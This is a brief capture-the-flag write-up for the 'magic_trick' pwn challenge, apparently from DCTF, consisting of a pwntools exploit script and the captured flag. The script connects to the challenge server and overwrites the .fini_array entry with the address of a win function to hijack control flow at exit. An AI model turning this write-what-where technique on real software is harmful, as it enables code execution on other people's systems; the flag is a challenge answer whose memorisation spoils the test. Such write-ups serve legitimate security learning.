## ***MAGIC_TRICK***

```py
from pwn import *

binary = context.binary = ELF('./magic_trick')

p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

p.sendlineafter('write\n', str(binary.sym.win))
p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
print(p.recvuntil('}').decode())
```

Flag : ***```dctf{1_L1k3_M4G1c}```***
